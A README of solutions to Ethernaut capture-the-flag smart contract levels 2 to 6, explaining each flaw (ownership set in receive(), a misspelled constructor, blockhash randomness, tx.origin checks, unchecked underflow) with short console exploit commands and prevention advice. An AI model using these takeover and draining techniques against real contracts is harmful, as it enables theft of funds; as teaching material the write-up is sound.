# Ethernaut

> **CTF-style smart contract hacking challenges.**
> 
> This repo contains solutions and explanations for Ethernaut levels. Each branch corresponds to a different level.

## 🪙 Level 2: Fallback

### Overview

This challenge demonstrates how improper use of the `receive()` function and weak access control can allow attackers to take ownership of a contract and drain its funds.

The Fallback contract allows:
- Users to contribute small amounts of Ether.
- Ownership transfer to contributors who exceed the current owner’s contribution.
- Receiving Ether via `receive()` to also set the sender as the owner (if they have contributed before).

**Goal:** Become the owner of the contract and withdraw all funds.

---

### 🔍 Vulnerability Analysis

- **Weak Ownership Logic:**
  - Ownership can be reassigned if:
    - You send Ether directly to the contract using `receive()` **and**
    - You already have a non-zero contribution.
- **Lack of Proper Access Control:**
  - The `receive()` function is not protected by `onlyOwner`, so any contributor can trigger it to become the owner.
- **No Minimum Threshold for Ownership Transfer via receive():**
  - Any amount of Ether (>0) is enough to change the owner after a contribution.

---

### 🛠️ Exploitation Steps

1. **Make a Small Contribution**
   
   You must first contribute to have `contributions[msg.sender] > 0`:
   
   ```js
   await contract.contribute({ value: toWei("0.0000000000001") });
   await contract.getContribution(); // should be > 0
   ```

2. **Trigger `receive()` to Become Owner**
   
   Send Ether outside the ABI (direct transaction) to the contract address:
   
   ```js
   await contract.sendTransaction({
     to: "0xDBEBD77F08559597e2c4DA23520ca5603e151C66", // contract address
     value: toWei("0.0000000000001")
   });
   ```
   Now the `receive()` function runs and sets you as owner.

3. **Verify Ownership**
   
   ```js
   await contract.owner();
   // should return your wallet address
   ```

4. **Withdraw All Funds**
   
   ```js
   await contract.withdraw();
   ```
   All Ether in the contract is now transferred to your address.

---

### 🪲 Root Cause

The vulnerability stems from allowing state changes in `receive()` without proper access control.

> **Best practice:** Use `receive()` only for accepting Ether, not changing contract ownership.

---

### 🛡️ Prevention

- Never change ownership in `receive()` or `fallback()`.
- Use strict access control (`onlyOwner` or similar modifiers).
- Avoid logic in `receive()` that can be abused by anyone sending Ether.

---

## 🪙 Level 3: Fal1out

### Overview

In Solidity versions before 0.7.0, a constructor was defined by giving the function the same name as the contract. In this challenge, the intended constructor is misspelled as `Fal1out` instead of `Fallout`.

As a result, it is a public function that anyone can call—even after deployment—and it sets the `owner` variable to `msg.sender`. This lets us take ownership of the contract.

---

### 🔓 Vulnerable Code

```solidity
/* constructor */
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

Because `Fal1out` is not recognized as a constructor, it becomes an external function that can be called by anyone.

---

### 🛠️ Exploitation Steps

1. **Deploy or create an instance of the challenge contract.**
2. **Call the `Fal1out()` function with your wallet:**
   ```js
   await contract.Fal1out();
   ```
3. **Verify ownership:**
   ```js
   await contract.owner(); // should return your address
   ```
4. **Withdraw funds:**
   - You are now the owner and can call `collectAllocations()` to withdraw funds.

---

### 📝 Key Takeaways

- In Solidity <0.7.0, constructors are identified by name matching the contract name exactly (case-sensitive).
- A typo in the constructor name turns it into a publicly callable function.
- From Solidity 0.7.0 onward, constructors are declared with the `constructor` keyword to avoid this issue.

---

## 🪙 Level 4: Coin Flip

### Vulnerable Contract & Problem

The original contract determines the coin flip outcome using:

```solidity
uint256 coinFlip = uint256(blockhash(block.number - 1)) / FACTOR;
```

- `blockhash(block.number - 1)` is publicly available, so anyone can predict the outcome before calling the function.
- `FACTOR` is a constant that makes `coinFlip` either 0 or 1.
- **Result:** The randomness is fully deterministic and predictable.

---

### 💥 Exploit Strategy

1. Read the blockchain’s last block hash using the same formula as the contract.
2. Calculate the expected outcome (`true` or `false`).
3. Submit the guess to the contract.
4. Repeat for 10 consecutive wins to complete the challenge.

---

## 🛠️ Hack Contract (FlipCoin Branch)

### 🔑 How the Hack Works

- The Hack contract imports the vulnerable CoinFlip contract.
- `_guess()` replicates the calculation from the original contract.
- Both contracts run in the same transaction, sharing the same `block.number` and `blockhash`, ensuring the prediction is always correct.
- By calling `flip()` every block, the attacker gets a 100% win rate.

---

## ⚠️ Security Lessons

- On-chain randomness is **not secure** if it relies on predictable values like `blockhash` or `block.timestamp`.
- Use [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction/) or other verifiable randomness oracles for secure random numbers.
- Never assume miners won't manipulate predictable variables—they can influence them.

---

## 🪙 Level 5: Telephone

### 🎯 Objective

Become the owner of the Telephone contract.

---

### 🔍 Understanding the Vulnerability

The Telephone contract has a function:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

- `tx.origin` is the original externally-owned account (EOA) that started the transaction.
- `msg.sender` is the direct caller of the function.
- The condition `tx.origin != msg.sender` ensures you cannot call `changeOwner` directly from your wallet, because in that case both values would be the same.
- However, if you call `changeOwner` through another contract, then:
  - `tx.origin` will be your wallet address (EOA).
  - `msg.sender` will be the attacking contract’s address.
- This makes the condition `tx.origin != msg.sender` true, allowing us to change the owner.

---

### 🛠️ Exploit Strategy

Deploy an attacker contract that:
- Stores the target Telephone contract address.
- Calls `changeOwner(msg.sender)` on it.
- Call the attack function from your wallet so `msg.sender` in the target contract is the attacker contract’s address.
- This bypasses the `tx.origin` check and sets you as the owner.

---

### 💻 Exploit Code (Telephone branch)


### 📝 Step-by-Step Execution

1. **Deploy the HackTelephone contract** with the Telephone contract’s address as a constructor argument.
2. **Call `hackTelephone()` from your wallet.**
3. **Verify ownership in the console:**
   ```js
   await contract.owner(); // should return your wallet address
   ```

---

### ⚠️ Key Takeaway

- **Never rely on `tx.origin` for authentication checks.**
- Always use `msg.sender` to validate the caller, and implement proper access control with `onlyOwner` or similar patterns.

---

## 🪙 Level 6: Token

### 🎯 Objective

You start with 20 tokens. The goal is to increase your balance beyond the initial amount using the given smart contract.

---

### 🔍 Vulnerability

The `transfer` function has this check:

```solidity
require(balances[msg.sender] - _value >= 0);
```

- Since this contract is compiled with Solidity 0.6.0, arithmetic operations do **not** automatically revert on underflow/overflow.
- If you try to transfer more tokens than you have, `balances[msg.sender] - _value` underflows, wrapping around to a huge number (close to 2^256 - 1).
- This drastically increases your balance.

---

### 🛠️ Exploit Steps

1. **Deploy the level instance.**
2. **Call:**
   ```js
   await contract.transfer(<victim_address>, 21);
   ```
   Here, 21 is more than your balance (20), causing an underflow.
3. **Your balance will now be a huge number, completing the challenge.**

---

### 🧪 Proof of Concept (JavaScript Console)

```js
// Check initial balance
(await contract.balanceOf(player)).toString();
// > 20

// Exploit: Transfer more than you have
await contract.transfer("0x0000000000000000000000000000000000000000", 21);

// Check balance again
(await contract.balanceOf(player)).toString();
// > Very large number (underflow occurred)
```

---

### 📝 Key Takeaways

- Before Solidity 0.8.0, arithmetic was unchecked by default, allowing underflows and overflows.
- Always use SafeMath (or Solidity 0.8+ built-in checks) for safe arithmetic.
- Never assume `require(x - y >= 0)` will prevent negatives — with unsigned integers, negatives don't exist, they wrap.

---










